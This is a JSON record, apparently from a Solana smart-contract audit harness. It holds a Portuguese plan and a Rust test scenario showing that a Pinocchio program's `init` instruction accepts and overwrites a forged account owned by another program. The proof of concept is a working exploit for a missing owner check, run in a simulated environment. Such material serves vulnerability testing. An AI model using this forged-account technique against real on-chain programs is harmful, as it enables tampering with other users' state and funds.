{"plan": "O programa `init` (Pinocchio) escreve em `accounts[0]` sem verificar o dono. Monto um baseline com uma conta `config` cujo dono e o proprio programa (uso legitimo, deve ter sucesso). No ataque, troco apenas o dono da conta `config` por um dono arbitrario (outro programa), mantendo os mesmos dados/lamports, e chamo a mesma instrucao. O efeito medido e que a conta forjada (dono diferente do programa) foi aceita e teve seus dados sobrescritos pelo programa.", "scenario": "let program_id = env.program_id;

// Conta config legitima: dono = programa, dados zerados (nao inicializada)
let config_legit = account(&program_id, &[0u8; 64], None);
let authority = Pubkey::new_unique();
let authority_acc = wallet(1_000_000_000);

let metas = [
    AccountMeta::new(config_legit_key, false),
    AccountMeta::new_readonly(authority, false),
];

// Baseline: uso legitimo com conta do proprio programa
let ix_legit = env.raw_ix(&[IX_INIT], &metas);
let contas_legit = [
    (config_legit_key, config_legit.clone()),
    (authority, authority_acc.clone()),
];
let r_base = env.baseline("init legitimo com conta do programa", &ix_legit, &contas_legit);

// Ataque: mesma instrucao, mas a conta config tem dono diferente (outro programa)
let outro_dono = Pubkey::new_unique();
let config_forjada = account(&outro_dono, &[0u8; 64], None);

let contas_ataque = [
    (config_legit_key, config_forjada),
    (authority, authority_acc),
];
let r = env.attack("init com conta de dono arbitrario", &ix_legit, &contas_ataque);

if r.program_result == ProgramResult::Success {
    let dados = after(&r, &config_legit_key).data();
    env.effect(
        "conta forjada (dono != programa) foi aceita e sobrescrita pelo programa",
        after(&r, &config_legit_key).owner() == &outro_dono
            && read_u64(dados, 0) == 0x0807060504030201
            && dados[40] == 1,
    );
}
"}

